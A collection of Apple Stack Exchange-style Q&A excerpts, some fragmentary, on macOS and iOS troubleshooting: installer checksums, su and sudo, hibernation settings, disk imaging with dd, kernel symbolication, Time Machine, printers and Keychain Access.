provides are all to Apple servers.\nThe page also includes sha256 digests for each download. As well as a way to check the accuracy of the download, it would also be a way of checking the accuracy if you do choose to download from elsewhere.\nMrMacintosh has other useful pages. How to download describes various ways you can download from Apple's servers - many of these are scripts or apps to assist the process.  For myself, I use the MDS method.\nFrom the question, I think you have just one Mac to update. If you had multiple Macs there is also Content Caching.\nAs you have probably realised, the size and frequency of updates has increased with Big Sur. Read Squeezing a thimbleful of update into a ten-gallon can for a thoughtful diatribe on this issue.\nEdit:\nFor the Big Sur 11.5.2 a checksum on the macOS install application from Apple can be calculated using:\ncd .../Install macOS Big Sur.app\nfind CONTENTS -type f -exec shasum {} \\; | sort -k 2 | shasum\nd7bcbae11844285c60a3d871710381e4e8acde73\n\n[The find and shasum command was taken from Stack Overflow answer]\nFor macOS install app from another source, the checksum can be calculated in the same way and compared.\nAs an experiment I found a non-Apple torrent file. The downloaded install app had the same checksum.\nBut I am not going to use it!\nFor torrenting to be a viable and safe method, you need a trusted friend with a reliable connection to download the install app from Apple and compute the checksum.

Your normal account is probably an admin account (i.e. it's a member of the admin group, and is therefore allowed to do things like change system-wide settings in System Preferences). I think what you're trying to do is become root (aka superuser). On macOS, the root account generally doesn't have a password (and shouldn't). See my answer here for more about the distinction.\nGiven that, the short answer is that if you're already logged in as an administrator, you should use sudo -s to open an interactive shell as root (or sudo somecommand to run a single command as root).\nIf you're logged in as a standard (non-admin) user, you have to promote to root in two steps: first, use su someadmin (where someadmin is the name of an admin account you know the password to) to promote to administrator, and then use sudo -s as above to become root from there. Note that both commands will ask for a password, and in both cases it's the password of the admin account you're going by way of.\nMore explanation: in macOS, both the su and sudo commands can be used to switch between accounts, but they have a couple of significant differences:\n\n*\n\n*su asks for the password of the account you're switching to. Since root doesn't normally have a password, this means su can't be used to switch to root. On the other hand, sudo asks for the password of the account you're switching from, and then checks a config file (/etc/sudoers) to see if your account is allowed to do that (which, by default, is set to \"if you're in the admin group or are root, you can do whatever you want\").\nThese differences are why, if you're logged in as a standard (non-admin) user, you need to use both to promote from a standard user to an admin and then to root.\n\n\n*su defaults to running an interactive shell session as the user you're switching to, but you can run a single command with its -c option. sudo is the reverse -- it defaults to running a single command, but its -s option tells it to open an interactive session.\nP.s. there are a couple of related questions: \"What is the difference between the sudo and su command?\" and \"sudo vs su (as non-root user)\".\n\nA: On Mac Os X the default command to be admin isn't su but sudo.\nWhen you want to keep the admin privileges in terminal, you can use\nsudo -s\n\nIf you want use su you can add the root password with the command\nsudo passwd root\n\n\nA: There is no user called \"admin\". But there is a Group called Administrators. You need a username which is a member of that group - probably the first username you created.  Check with System Preferences. After that the steps you need are:\n\n*\n\n*Login with the username that is an Administrator\n\n\n*In Terminal:\nsudo su\n\n\n*and provide the password of the username.\n", "Q: Is there any valid reason to install Tigerbrew (Homebrew) on a modern Mac OS? Perhaps you may be thinking that I'm asking why one should install Tigerbrew on their older PowerPC/Intel mac machine running Tiger or Leopard operating systems.\nBut I'm actually wondering if there's any reason to install it onto a modern Intel mac machine.\nI'm running a Macbook Pro 2012 with El Capitan 10.11.6, and for some reason which I do not understand, when I type the command man brew in Terminal.app, I find the following:\n       Tigerbrew  is  the  easiest  and  most flexible way to install the UNIX\n       tools Apple didn't include with OS X.\n\nIs there any reason why I would have Tigerbrew and not regular Homebrew? Did I download this in error?\nI'm more inclined to think that I was just curious and had no reason, rather than something less likely, like I was hacked...somehow?\n\nA: I think it's safe to assume that you were not hacked by someone who then installed Tigerbrew on your computer.\n\nA: From mistydemeo: Tigerbrew is \"A little experimental fork of Homebrew that adds support for PowerPC Macs, and Macs running Tiger (or Leopard).\"\nSo, on the face of it there is no reason to install Tigerbrew on a modern macOS. In fact, there are good reasons to remove it.\nBut:\n\n*\n\n*You don't have a modern macOS and the real Homebrew is fully supported on 10.14 onwards and only best effort on 10.9-10.13\n\n\n*Homebrew's installation instructions say \"For 32-bit or PPC support see Tigerbrew\".\nSo that gives 2 reasons for you to use Tigerbrew:\n\n*\n\n*Homebrew's lack of full support for your version of macOS though it probably would work fine for installing basic unix utilities.  On the other hand, Tigerbrew is not intended for more recent than Leopard.\n\n\n*You particularly want to install old 32-bit brews.\nBut, if it were me, I would uninstall Tigerbrew (following instructions from here ) and install Homebrew.

By default it will use a simple subnet 'one higher' than your existing one - e.g. if you use 192.168.0.x it will set up 192.168.1.x\nIt will create a DHCP server & NAT to do this pretty seamlessly.

He lives hours away from any Apple stores and any convenient sources of computer help.\nHere’s the situation:\nHe has a MacBook Pro (Retina, 13-inch, Late 2013) Model A1502 running Big Sur 11.2.3.\nHe has a 500 GB internal SSD that is slightly less than half full.\nThe problem began when Mail quit with this alert: <Mail cannot save information about your mailboxes because there isn’t enough space in your home folder.  Quit Mail and delete any files you don’t need.  Then open Mail again.>\nI researched that and found the suggestion to reset the NVRAM and do a Safe Boot.  After doing so, Mail was fine for one day and then the situation repeated with the same alert and Mail quits.\nWhile sharing desktops, I noted the red number 4 on the App Store icon in his Dock.  We went to the App Store to update four apps and when we tried to do so we got this alert:  <Installation failed.  Can’t install the software because there is not enough space.  4.81 GB is needed but only 407.8 MB is available>.  This is of course non-sensical because he has well over 300 GB of free space on his internal HD.\nWe tried to download the Maintenance.app from Titanium Software and when we did so and dragged the apps icon into the Applications folder, it would not work noting that more space was needed.\nAnd now it gets even more bizarre.  I could see that something serious was wrong and wanted to be absolutely sure he had a good backup before proceeding.\nI had him attach an empty, 500GB OWC SSD and go to Time Machine preferences, and unlock them, in order to select the attached OWC SSD for use with TM.  Even though we could view that OWC SSD icon on his desktop and view it in Disk Utilities, I could not get it to appear in Time Machine preferences so we could initiate a backup.\nUsing Disk Utility to view that OWC SSD, it listed:\nExternal USB 3.0 Media\nContainer disk4\nOWC Auro Pro X2\nASRDataVolume2.\nI selected each of the above in turn, right clicked on each, ran First Aid, and all passed.\nI also looked up Apple Diagnostics Test and told him to restart holding down the D key and note the results, codes, etc. Will post the results here later.\nI simply don’t know what to do at this point and really need some help and guidance, for which, many thanks.\n\nA: There are probably local snapshots on the data partition which is not accounted for in About My Mac > Storage.

It worked and I could boot on the two systems.\nI've done some sh... weird things and now the EFI of Debian isn't recognized by the system, also the Mac APFS Partition is unmounted, and not mountable because the Recovery system OF THE MAC (not the one on the Macintosh APFS Partition) is from 2015 so pre-APFS. I'm stuck with this screen or the old Recovery partition. I have on another disk a disk image of the COMPLETE Macintosh Partition (not only the data).  Can someone help me to mount the disk image in APFS and put it on my mac (making it bootable) ? Thanks !!!!\nPS: Yes, it's the same problem as this question, but the answer isn't understandable. So don't give me some commands without explanations, please.\nPPS: If you need more infos, ask under this post.\n\nA: You can try from the terminal in Recovery Mode, modify the ffff partition by apfs structure.

I forgot the passcode of my 2nd iPhone and now it's permanently disabled. If I reset it with iTunes will it also remove the data of the Apple ID from the first device which is logged in with that ID?\n\nA: I gather the situation is that you have a primary iPhone and a secondary iPhone that are both logged in with the same AppleID and thus have some of the same data on them synced via iCloud.\nDue to the forgotten pass code, you're thinking of erasing all contents on the secondary iPhone and restoring it with a blank iOS installation.\nIn that case, the data on your primary iPhone is not erased. Data stored in iCloud will not be erased either.\n", "Q: Does macOS have hibernation where no power is used? Does macOS have hibernation mode which works exactly like hibernation in Windows (RAM is saved to the disk and power is switched off)?\nWhen I use hibernation in macOS, computer still consumes energy. Is it possible to set it somehow, so that power is switched off after hibernation?\n\nA: Yes, Mac OS X does have this feature. It is known as \"hibernate mode\" where as the other modes you have experienced are normally known as variations of \"sleep mode\".\nFor older laptops (before 2005), hibernation was actually the default mode of operation. For newer laptops that is no longer the case.\nYou can see the current mode in use with a command line like this:\npmset -g | grep hibernatemode\n\nYou can set the mode using a command line like this:\nsudo pmset -a hibernatemode 1\n\nWhere \"1\" means hibernation. The default for newer laptops is mode \"3\", which is known as safe sleep.\nNote that you might experience problems in practice with newer laptops. It might not be possible to keep them in hibernation with only the above mentioned command. You can experience that for example external peripherals and the Power Nap feature wake up the computer unexpectedly. YMMV.\nIf you rather want a GUI utility than fiddle with commands like above, you can use a program such as SmartSleep to set the sleep/hibernation mode:\nhttps://www.jinx.de/SmartSleep.html\nNote however that it doesn't seem to support the latest macOS releases, so it is probably only applicable to a bit older laptops.\n\nA: sudo pmset -a hibernatemode 25 standby 1 standbydelayhigh 1 standbydelaylow 1 autopoweroff 1 autopoweroffdelay 1\n\nwill set the power management policy to force supported systems to enter safe sleep followed by ACPI S5, i.e., power off, upon a user-initiated sleep. Note that this will disable most wake sources, so on many machines the only way you'll be able to wake is by pressing the power button.\n\nA: No, macOS does not have this feature.\nThere are various tutorials around which will suggest different commands to try to emulate this feature on Windows using the pmset command, but in my experience, it has never worked even close to reliably, and it is definitely not a configuration supported by Apple.\n", "Q: Put phone app back on dock in iOS I accidentally removed the Apple Phone app from the dock.\nNow I cannot locate the Phone app icon, so I cannot drag it back to the dock. Too many apps, too many folders.\nI asked Siri to show me the Phone app. But she insists on launching the app rather than showing me the app icon.\nHow can I get the lost app icon back on the dock.\n\nA: You may have accidentally deleted the Phone app icon from the Home Screen.\n\niOS does not allow you to uninstall the Phone app, so the app is still installed on your iPhone, with the app icon visible in the App Library.\nYou can get the Phone app icon back in the Home Screen using the following steps:\n\n*\n\n*Keep swiping Left on your Home Screen until you see the App Library.\n\n\n*Locate the Phone app within the App Library. Use the search bar shown at the top if you have too many apps installed and are unable to locate the Phone app.\n\n\n\n*Now touch and hold on the Phone app icon and select the Add to Home Screen option in the app icon's context menu.\n\n\n\n*The Phone app icon would be added in your Home Screen.\n\n\n*Now tap and hold in any empty area on your Home Screen until the icons start wiggling.\n\n\n*Drag the Phone icon and put it in the Dock.\nYou can find an easy to follow demonstration of the above in the official Apple Support video on YouTube:\n\n*\n\n*https://www.youtube.com/watch?v=53eOAsqGQC0\nOn the other hand, if you have not deleted the Phone app icon from the Home Screen, but merely moved it from the Dock, you'd need to locate it among one of the Home Screen pages or folders therein.\nIn either case, you should be able to see the Phone app icon in the App Library. If the Phone app icon's context menu in the App Library doesn't give you the Add to Home Screen option, it's buried somewhere in one of the Home Screens.\n", "Q: Is it possible to recover the serial number of a hard drive used for Time Machine? According to Apple's help pages a fingerprint of the time machine backup hard drive is stored for security reasons.\nI wonder, is there any way to recover serial or some other unique ID about the drive so that I know if the broken drive in front of me is indeed the one with my old time machine backup?\n\nA: Unfortunately you cannot recover the drive's serial number that way.\nAs mentioned in the help page you link, the identity is used to check amongst other things whether or not you have erased/reformatted the backup disk. Therefore the identity is not something that identifies the physical disk, but rather the file system that is put on it.\nIn actuality the identity is simply UUIDs that are stored in a plist file on the host computer. When you format for example a HFS+ volume, a persistent, unique UUID is written to it. It is this number that is used as the identity.\nThis means that if you replace the disk with something else, if you reformat the drive, if you erase the drive, or similar - the computer can detect it as a different disk.\nYour only hope now is if the broken drive you have is not so broken that you can't read the HFS+ persistent UUID from it. On a non-broken disk, you'll be able to read it out by running:\ndiskutil apfs list\n\nor\ndiskutil cs list\n\n", "Q: Can't Get Applescript To Press Keys I have been trying to use Applescript in Automator to press certain keys and have looked on countless websites about using Applescript and can't get any answers on how to fix my problem.

So we know that CPU control has been returned from EFI to macOS by this point and all system device drivers have finished powering up their associated hardware, but not all software that needs to handle the wakeup has finished handling it yet.\nWhat strikes me is that although the rest of the kernel is quiescent at this point, one of its threads appears to still be in the middle of handling a power transition for the Bluetooth controller, even though we just said that all drivers have indicated that they are done:\n  Thread 0x2633e    Thread name \"thread call high #18\"    1 sample (1)    priority 93 (base 93)\n  <IO tier 0>\n *1  call_continuation + 46 (kernel + 139582) [0xffffff800023213e] 1\n   *1  ???

I would expect that if this is the case then the kernel should not have advanced its sleep-wake phase point to 0x27 yet.\nWithout access to the Bluetooth driver source code, we can only guess as to what's really going on or whether this is normal, but one possibility that it may suggest is that Bluetooth is actually not done with its power transition even though the kernel believes that it is. Such race conditions can often cause erroneous state, which leads to sleep-wake failures.\nUltimately root-causing this failure will require reproducing it and having significantly more debugging facilities available. There is not nearly enough information available in this report to find root cause. So we can't be sure whether it's due to buggy hardware, buggy firmware, or buggy software. The best you can do is watch for recurrences.\nIf this happens regularly, as an experiment you can try disabling Bluetooth and see if the problem goes away. As a modest help for future information gathering, you can enable kernel symbolication in order to try to reduce the occurrences of ??? in your stackshots. I've added information on how to do this below.\nIn any case none of this is user error and you should file a bug report with Apple and then contact Apple Support.\n\nTo enable kernel symbolication:\n\n*\n\n*Run the following Terminal command: sudo nvram boot-args=\"keepsyms=1\". Make sure to copy-paste this so that you're entering straight quotes rather than curly/“smart” quotes. (If you get a permission error, you will first need to disable System Integrity Protection. You can re-enable it after you're done with this investigation.)\n\n*Reboot your machine. The next time this failure occurs, your report will have a symbolicated backtrace.\n\n", "Q: Size on disk smaller than actual size I have Bitwarden on my machine and looked at the reported file size, wich is 423,6MB.

I've recently changed my router(+NAS), Time Capsule, due to this problem, and now using\nnew router, which is this one.\nIt's working very good with my iPhone, iPad, two iMac and a Mac Mini. However, when it comes to my Macbook Pro, they don't work as intended.\nBefore changing my router the wi-fi internet connection was very fine. So, I thought the router is having some problem, but it doesn't make sense since every other device I have is working very nicely. Then, I re-connected my Time Capsule to see if I can connect to internet with my MBP, and it works. So, I have no idea what's happening right now.\nThe problem is only happening with the new router, other wifi is working fine, like workplace wifi, tethering, etc...\nI've checked if I'm having any error code or something but there wasn't anything I can find of. Now I don't know what to do.\n\nEdit:\nSo far, I've tried the solution recommended by comment below:\n\n*\n\n*Rebooting/Resetting router. Nothing changes.\n\n*Resetting DNS settings. Nothing changes.\n\n*Deleting network related plists(Method 2)+Reboot MBP. Nothing changes.\n\n*Check if the problem is still occur in Safe mode. It does.\n\n*Check if the problem is caused by 2.4/5Ghz bandwidth. No, it wasn't.\n\n*Unplugged all USB devices. Still, there's problem.\n\n*Changed MTU to 1492. Nothing changes.\n\n*Tried creating new network locations. Nothing changes.\n\nI'm only using DHCP because I use this mac when I'm not in home, such as workplace, so using a static IP address is not a very smart idea.\nI am now talking with Apple to investigate what's causing the issue.\n\nA: So, after a while of talking with Apple CS, we found out that the problem was on the router side...\nFor the reasons unknown, the router wasn't allowing my MBP to connect it. I've reset the router 3 times(again), but my MBP still didn't connect but other device can(as I wrote earlier). So, I asked for replacement of the router... and voila! it's now working.\nI've wasted so many times on this, but yeah, it works now.\n", "Q: iOS/iPadOS: Shortcuts from unknown source - inspect what it does for real I'm trying to teach iPhone/iPad to import a calendar event from *.ics file (by default it's possible only when *.ics is opened from and only from Mail app).\nI found there is a shortcut called ICS To Calendar which does exactly what I need. But routinehub.co is not one of official trusted sources.\nI'd  like to examine what does this shortcut in real before installing it. What I know about shortcuts is that they are basically XML files with routine blocks there.\nIs possible to download it from different device and open in text editor to see what it does? Or is there some other way?\nThanks for your help!\n\nA: Instead of downloading it on a different device and try to understand the xml-code, you can just download it on your iPad, and then it will open in the shortcuts app without directly being installed or integrated in any way. Instead you will be shown a complete editable copy of the given shortcut like if you did it yourself, and there you can look into every executed part of it.\n\nJust for the record, trusting unknown shortcuts can be really dangerous, I would recommend to send the file to your own email and open it from there.

I use an iPhone 8. By default, Skype and Zoom use the front camera. But my rear camera has higher resolution and quality, correct? How can I order video conferencing apps like Skype and Zoom to use the rear camera?\n\n\nA: If the app itself doesn't support it, you can't do it. It's the code of the app that determines which camera is to be used. There is no system-wide setting to override this.\nI don't have Zoom, but Skype does have the option to switch cameras; there's an icon in the top right corner which does this:\n\n\nA: Zoom has the ability to switch cameras in the iOS app.  The switch is available in the top left of the screen once you have started a meeting.  It does not appear that you can select the rear camera before you start the meeting;  so you will always have a moment where the front camera is \"on\" before you switch to the rear camera.\n\n", "Q: Is possible to redefine application's shortcut?

If yes, could please someone add some hints?\nEDIT\nFor the fast-commenters:\n\n*\n\n*The current state: the CMD-N opening a \"New window\".\n\n*The final state: the CMD-N should run my own Automator script...\n\n*Is this possible?\n\n\nA: Assuming the Automator Service/Quick Action settings are, e.g. in macOS Catalina,... Workflow receives [no input] in [SomeApp] and it's assigned the keyboard shortcut of ⌘N in System Preferences > Keyboard > Shortcuts > Services, it is not global in the sense that now ⌘N in every application is going to run that Service/Quick Action. Only the application defined as SomeApp is going to receive the ⌘N keyboard shortcut.\nThis of course means that SomeApp must have focus to receive the ⌘N keyboard shortcut assigned to the Automator Service/Quick Action.\nTherefore, in order to have SomeApp respond to ⌘N as the Automator Service/Quick Action the New Window command of SomeApp must be reassigned to e.g. ⌥N in System Preferences > Keyboard > Shortcuts > App Shortcuts.\nGo to System Preferences > Keyboard > Shortcuts > App Shortcuts1 and click the [+] button.\n\n*\n\n*For Application: select the target application (SomeApp).\n\n*For Menu Title: use New Window (Or exactly what is on the menu for the command you want to change.)\n\n*For Keyboard Shortcut: use, e.g.,: ⌥N (Assuming no other command is using that one in that application. You must determine that, e.g., ⌥N, or whatever you change it to, is not already in use.)\n\nThen click the Add button.\nNow when SomeApp has focus and you press ⌘N the Automator Service/Quick Action will be triggered.\n\nNotes:\nWhen a keyboard shortcut is assigned to an Automator Service/Quick Action in System Preferences > Keyboard > Shortcuts > Services, it is only global if the Automator Service/Quick Action is set to ... in [any application], and when set to SomeApp it only appears in that applications Services menu.\nI have found in some cases pressing the assigned keyboard shortcut may not trigger the first time and that manually triggering it once from the Services menu takes care of that.\nAdditionally keep in mind that all of this assumes necessary and appropriate settings in System Preferences > Security & Privacy > Privacy have been set/addressed as needed.\n1 See Create keyboard shortcuts for apps on Mac for additional information.\n", "Q: Can I upgrade MacBook Pro mid-2012 with PCIe gen 4 using a SATA adapter?

The Wifi signal of the Cisco is very weak so the Airport has to do all the router functions such as DHCP and WIFI\nWhat to do on the Cisco before I can install de Airport. Yes I have to set the Cisco in Bridge mode... but then what to do next? Have I to NAT on the Cisco?\n\nA: I think it depends on what you want to achieve. You may still want the Cisco to act as the gateway because it has more robust features than an Airport.\nIf you only want to replace the Cisco's WiFi signal, disable the Cisco's radio. Then connect the Airport and disable DHCP. Probably a good idea to assign it a static IP as well.\nIf you want the Airport to handle everything, like DHCP and firewall, then yes - bridge mode.\n", "Q: Is iCloud required for iOS update?

Will a different Apple ID suffice?\nI know iCloud is used to backup data but I don't use it that much but I don't want to get locked out from my phone permanently.\n\nA: Short answer to your question is \"No.\" Updates do not require you to verify your phone number.\nBut as you said you no longer have access to your phone number linked to your iCloud account, you should update your current number in iCloud as soon as possible (here is how).\nIt is also recommended to backup the phone before updating, so you may want to fix your phone number issue first and use iCloud backup to make things easy.\n\nA: No, you have to enter the device passcode (if set) to update iOS.

Very similar question to this one here\nI have a Mid-2015 MacBook Pro - A1398 (EMC2910). Without going into details why, I would like to save an exact, sector by sector copy of the entire drive (currently running El Capitan and Windows 10 via Boot Camp) to another location as a single image file, without logging-in at all, and restore it back as-it-was at a later date, as if the system has never been touched. After imaging the SSD, I want to erase the entire drive and reinstall and update macOS to the latest version (Big Sur). That means a Boot Rom update, too, and it worries me a bit when it comes to restoring the system back from the image. Does this sound doable? I can get a 12+16 to PCI-E adapter and clone the drive that way using another Linux/PC system, but if it's possible without disassembly (using an external boot drive + another one for storing the created image) that would be great.\n\nA: You can definitely clone the drive. The easiest way is probably this:\n\n*\n\n*Boot the Mac in Internet Recovery mode (hold Option-Command-R during boot)\n\n\n*Unmount the main drive if it is automatically mounted\n\n\n*Plug in an external USB drive for storing the image\n\n\n*Open Terminal and copy the drive using a command something like this:\ndd if=/dev/rdiskX of=/Volumes/MyUSBDisk/image.img bs=512k\nwhere X should be replaced with the actual disk number of your main drive (check and double check with Disk Utility in advance) - and MyUSBDisk should be replaced with the name where your USB drive is actually mounted.\nThis will give you an image file with the contents of the drive, which you should be able to roll back without any problems.\nHowever, I don't think you'll be able to easily roll back the Boot ROM update. It is usually not a practical problem though, as upgrading usually still allows booting the old software.\n", "Q: Big Sur Finder iPhone File transfer to Mac external drive - over 24,000 files in a directory I'm trying to transfer a directory on an iPhone, using Finder on Mac. One of the subdirectories contains over 24,000 files.\nThe transfer takes a long time and it seems that the files are slowly accumulating in transference. However, after the transfer is complete, for some reason, the entire thing gets deleted.\nI am wondering if this is because there are too many files, albeit in a subdirectory? Or what might be causing this... Or how would I transfer such a case?\n\nA: I would recommend you zip the folder, send the zip to your iPhone, and unzip it on your iPhone. With normal moving, for every file, the mac reads, writes to the phone, reads the next file. This continuous switching is bad. With a zip, zipping occurs, all of the zip is read, all of the zip is written, and finally iPhone itself unzips the folder. The zip is so versatile that if mac --> iPhone isn't working you can email it to yourself or temporarily upload it to google drive or iCloud.\n", "Q: macOS 10.15.5 printer software list is empty I want to add a printer to MacBook Pro using an IP but failed.\nI enter the right IP. When I began to select driver by clicking \"select software\", I found there is nothing in the software list.\nThen I check the printer directory, /Library/printers, there are some drivers there. So, it's weird that the software list is empty.\nThen I search for some possible reason, some solutions told me to reset the printer and check the printer directory. But they are not helping.\nThen I typed\nlpinfo -v\n\nin terminal. It came to an error\nlpinfo: cups-deviced failed to execute.\n\nThen I reinstall CUPS system, but this is not helping either.\nI don't know what's wrong with my Mac printer.\nI have searched for possible reasons for many days. And there are no relevant answers I want. The question I want to clarify is not I cannot add a printer in macOS. The intrinsic problem is there is no printer driver software in System Preferences > Printers & Scanners > Add > Use > Select Software > Software list. But there are printer drivers in the path: /Library/Printers (include Epson, HP). That means there should be some drivers in the software list, but there are not. I asked this question because my colleague and I bought the exact same version of the MacBook Pro 13\" at the same time. But there are printer drivers in his software list. (we use the same steps to add a printer! Please note this premise.)\nIf you still can't understand my question, please leave comments below!\n\nA: I think the first thing to do would be to update Mac Os X to the latest version of Catalina (actually 10.15.7).\n", "Q: How to create a file that cannot be removed without root permission in macOS? I tried using chmod 000 <file>, chown -R root <file> and chgrp sys <file> . But it seems it can still be removed without root permission.

It can delete the file without asking for root.\n\nA: So I found what I should do from the link provided from anki .\nAll I need to do is chflags uchg <file>\nThe details of this command are in this link: http://hints.macworld.com/article.php?story=20031017061722471\n", "Q: user is not displayed on login screen after changing its UID I've changed my user's UID from 501 to 1000. Now on macOS startup, on login screen, I don't see my user icon; Instead there is \"Other\" icon asking for username and password. How to get back my user icon on login screen?\nI suspect the login screen starts looking for the users from UID=501. How to make new users take UID's from 1000 instead of 501 like Linux?\n\nA: Setting up UID 1000 in macOS will not show the profile at the log-in window. So, to fix the issue, you have to put other number such as 1001.\nYou can find more details:\nhttps://www.cnet.com/tech/computing/how-to-hide-user-accounts-from-the-log-in-window-in-os-x/\n", "Q: Is this a Mac Malware Today I was downloading some apps for an old windows PC I own using my MacBook Pro which has High Sierra. I downloaded Internet Explorer app from a googled source that I knew wasn't secure. And then via USB I installed it in my Windows PC, which didn't had a browser.\nAfter a few minutes my mac started to write only in uppercase and I noticed so I launched the keyboard watch app, and it had both shift keys continuously pressed.\nI decided to restart. But then when I entered the password it didn't work, I checked a few times and nothing.\nThere was this note on screen that said I could reset password pressing power until it powers off and then powering on again so I took that path and reset the password this time to just numbers to escape the uppercase. But it didn't work, and even thou I reset my Mac's password it still has the old password hint.\nSuddenly the screen showed me as follows: If your password is correct but don't let you enter your account, maybe it is not compatible with file vault. Here it started getting suspicious. But I deactivated File vault using my password and the thing is that in this interface, and in the interface of changing passwords the old password worked! Then I really thought I was being victim of fishing.\nHere is the thing, there's this  malware extracting info by taking screenshots and saving keyboard pulsations, so maybe I am infected\nI could be infected\nI don't know what to do. I disconnected from wifi but I need to know if I can solve it, if this is a keyboard issue or if it is a malware.\nNote: The screens of the interfaces when I was asked to input my passwords looked strange to me.\nI saw this message too. Input your password to unlock your HDD and the password worked even when I was to supposed to got that changed 5 minutes earlier.\n\nA: MalwareBytes free can help you, scanning your Mac : https://www.malwarebytes.com/mac\nMalwareBytes in free version can be updated and the only restriction is that scans of your Mac are triggered manually. The benefit of a tool is you don’t need to learn a lot about how processes start or stop or pick apart the most common unwanted software and malware.\n\nA: I think your best chance to tackle this, or rule out it's malware would be to create a rescue disk to boot from and then scan your hard drive. I suggest downloading one from a different computer altogether and then boot into it. Unfortunately it seems there is no anti-virus/anti-malware on a bootable CD/USB drive as such, but you can create a bootable macOS on a USB drive or external hard drive.\nMake sure you create one from a separate (ie. not your maybe infected) Mac:\n\n*\n\n*Format your drive using Disk Utility, download the latest macOS 10.13 High Sierra installer from the App Store and install it to the external drive.\n\n*Install one of those free virus scanners for Mac, e.g. from Bitdefender or Malwarebytes\n\n*Plug the drive into your switched off potentially infected Mac\n\n*Start it up holding ⌥ at startup to select the newly attached drive.\n\n*Once you booted from it, you can scan your disk.\n\nSince your issue was related to characters typed in, you might also want to try a separate keyboard first to rule out (or confirm) the keyboard as the culprit.\nPersonally, I've invested in a subscription of Bitdefender, Little Snitch as well as offline and online backups. While I have never had a malware infection that I'm aware of, I'm not taking my chances. Little Snitch is good for detecting which app wants to phone home. Both run quite unobtrusively in the background. Bitdefender downloads its regular updates and lets me know about them, but that's all. It's a little price for the hassle and the pain of data loss.\nGood luck!\n", "Q: Seamless PDF note taking between iPad Pro and MacOS? When viewing a PDF file, is there a way to take notes on it on my iPad Pro (highlight, write, etc) and then have it seamlessly transfer to my MacBook Air where I can take notes as well?\nThe ideal way would be like Notes work seamlessly between an iPad Pro and a Mac.\nSearching for this question yields no result because there are other things done with PDF and done seamless that take up the search results. Furthermore there is nothing about this question specifically.\nAgain, I am asking to create notes (highlight, write, etc) of PDF documents specifically. I am not looking for taking notes in general, I want to read my PDF files and mark them. After they are marked and edited on my iPad I want the changes to show up (within seconds and without me having to press \"send\") on my MacBook.\nI have the latest and greatest update to both my devices.\n\nA: Continuity Markup is one solution. I have not found a way to use it in anything besides Quick Look. Quick Look can be accessed by right clicking a PDF file. Then click \"annote\" and then connect your MacBook to your iPad via BlueTooth. Then a new icon will appear that you can press and a new app will open on your iPad. All editing is seamless between the iPad and the Mac OS!\n", "Q: Apple App Store Sign in loop (Mac Appstore) Whenever I try to sign in using my Apple ID it says \"This Apple ID has not yet been used with the App Store.\" and asks me to review my account info I click review and then it asks me to sign in again then it again says \"This Apple ID has not yet been used with the App Store.\" I sign in again its an endless loop.\nCan someone pls help me I need to download Xcode\n\nA: I resolved this problem on Macbook Pro (2019) (runs on Monterey) as steps below:\n\n*\n\n*Completely sign out Apple ID in local machine (specifically iCloud).\n\n*⌘ + Space to search Music.\n\n*Run Music.\n\n*Click on Account from topbar and click Sign In option.\n\n*Login your credentials and then Terms & Conditions page will be shown up.\n\nNote: If any information requiring by application like payment method, billing address or etc. (Security Code or Expiration Date informations can be blank inputs on this stage, even if you confirmed on appleid.apple.com.) fill them.\nNote 2: Be sure your credit card is open to online shopping, Apple sends a test request to validate.\n", "Q: How can I find out which file(s) links to another file This is a question about the reverse of a file link, which I can easily see in either Terminal or Get Info, ie. this\nlrwxr-xr-x   1 Alex  admin        35  7 Aug 23:35 envsubst -> ../Cellar/gettext/0.21/bin/envsubst\n\nIs there a way to see which files link to another file without doing a recursive find across all volumes?\n\nEDIT 1: (an extension to my original question, but not a good way to ask a second question)\n\nGiven the different nature of macOS aliases, is there is a way to find their original file too?\nEDIT 2:\nAnswer to how to find aliases is here.\nIn a nutshell: mdfind kMDItemKind=\"Alias\" | grep filename\n\nA: Symbolic links are just an entry in the currenct directory, as any other file. So if you want to find all symbolic links, you need to run find / -type l -ls or similar.\nThe link target (../Cellar/gettext/0.21/bin/envsubst) has no way of knowing which symbolic links points to it so there is no easy way to go \"backwards\".\nYou could run find / -type l -ls > /tmp/symlinks and then analyze the result to find link targets.\nPS: StackOverflow has more on this: Find all symlinks of a given 'original' file?

What i need to know is whether it is a mac hardware issue or just a software crash\n\nA: There's not enough information here to establish preliminary cause. At minimum, we should enable kernel symbolication and reproduce the panic to try to understand more about the failure chain. Instructions are below.\nThe only hint I have from this report is that (1) you are running VirtualBox, which includes four kernel extensions that inject code directly into protected kernel memory, (2) you are running Code Helper, which is presumably a Windows binary that is being executed via VirtualBox, and (3) you may be trying to communicate with a USB serial console device, probably as part of your Windows-based debugging. There is generally an elevated risk of instability when doing this via kernel extensions due to frequently buggy third-party code. So if this happens regularly, try stopping that workflow (and potentially running the VirtualBox uninstaller) and see if that resolves your panics.\nHere is how to enable kernel panic report symbolication:\n\n*\n\n*Run the following Terminal command: sudo nvram boot-args=\"keepsyms=1\". Make sure to copy-paste this so that you're entering straight quotes rather than curly/“smart” quotes. (If you get a permission error, you will first need to disable System Integrity Protection. You can re-enable it after you're done with this investigation.)\n\n*Reboot your machine. The next time this crash happens, your report will have a symbolicated backtrace. Update your question with the new report.\n\n", "Q: Keychain Access is opening but will not display a window? I have a 2017 MBP.  For the past couple of years, I've had a position that's provided me with a laptop, so my personal MBP isn't used much.\nOver those years I've kept it updated periodically, but today I needed to get back on my old machine and open an old, secure note in Keychain Access.\nThe problem is that when I open the application... nothing happens.  Well, it does open Keychain, and I see it in my dock bar.  If I click on it's icon, I can see the menu at the top of my screen, but there is no window.  When I right-click on the icon and go to \"Show All Windows\", there's nothing there.\nWhat's happened to Keychain Access, and why can't I bring up the UI?  Please note, I've also hunt-and-pecked the menu structure and I could see that I could create a new secure note but I can't open one.  In fact, I did create a new one as a test, and after saving it, the UI never popped up.  How can I get my Keychain Access back?  Thank you.\nOh, and I'm using MacOS Big Sur (11.5.2 (20G95))\nEDIT - Additional Information\nOne more piece of information that might be noteworthy is I have never setup iCloud for my Apple account, and I do not intend too.  I do have an Apple account, and I use it to connect to the App Store on my MBP, but I'm not interested in syncing my data with Apple's data plan.  I know it's quite useful for backing up personal settings and preferences, but as for the past many years, I've not needed it or wanted to give Apple that data.\nI mention this because has something changed in the past 4 years where my data is now hidden/locked out and is tied to my Apple ID, rather than my login to my laptop?  Is that fact that I'm not connected to iCloud preventing me from viewing my secured notes?  If the answer is yes, is there any way around this, without cutting on iCloud?\n\nA: In my case, if you are newly installing Monterey\n\n*\n\n*Quit 